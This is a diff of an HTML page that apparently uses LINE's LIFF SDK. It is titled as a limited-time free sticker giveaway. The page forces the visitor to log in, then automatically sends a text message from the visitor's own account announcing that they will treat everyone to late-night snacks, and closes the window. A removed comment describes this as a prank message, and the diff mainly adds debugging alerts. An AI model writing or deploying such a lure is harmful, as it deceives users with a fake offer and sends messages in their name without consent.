@@ -3,34 +3,39 @@
 <head>
     <meta charset="UTF-8">
     <title>限時貼圖免費領取</title>
-    <!-- 1. 修正了原本斷掉的 LINE 官方網址 -->
+    <!-- 引入官方 SDK -->
     <script src="https://line-scdn.net"></script>
 </head>
 <body>
     <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
-        <h2 id="status">正在載入 LINE 貼圖，請稍候...</h2>
+        <h2 id="status">正在檢查 LINE 連線，請稍候...</h2>
     </div>
 
     <script>
-        // 2. 確保 ID 綁定你後台的 2012018749-Jns1tBED
+        // 加上跳窗測試，確認網頁程式有沒有在跑
+        alert("網頁已啟動，開始初始化 LIFF...");
+
         liff.init({ liffId: "2012018749-Jns1tBED" }).then(() => {
+            alert("LIFF 初始化成功！目前登入狀態：" + liff.isLoggedIn());
+            
             if (!liff.isLoggedIn()) {
-                liff.login(); // 3. 加上強迫登入，防範卡死轉圈圈
+                alert("偵測到未登入，即將引導至登入畫面...");
+                liff.login();
             } else {
-                document.getElementById("status").innerText = "貼圖領取成功，正在關閉視窗...";
+                document.getElementById("status").innerText = "連線成功，正在自動傳送訊息...";
                 
-                // 4. 執行自動發送惡整訊息
                 liff.sendMessages([{
                     type: 'text',
                     text: '我今天心情好，晚上請大家吃宵夜！' 
                 }]).then(() => {
-                    liff.closeWindow(); // 傳完自動秒關網頁
+                    alert("訊息發送成功！即將關閉視窗。");
+                    liff.closeWindow();
                 }).catch((err) => {
-                    alert("傳送失敗：" + JSON.stringify(err));
+                    alert("【傳送訊息失敗】原因：" + JSON.stringify(err));
                 });
             }
         }).catch((err) => {
-            alert("初始化失敗：" + JSON.stringify(err));
+            alert("【LIFF 初始化失敗】原因：" + JSON.stringify(err));
         });
     </script>
 </body>
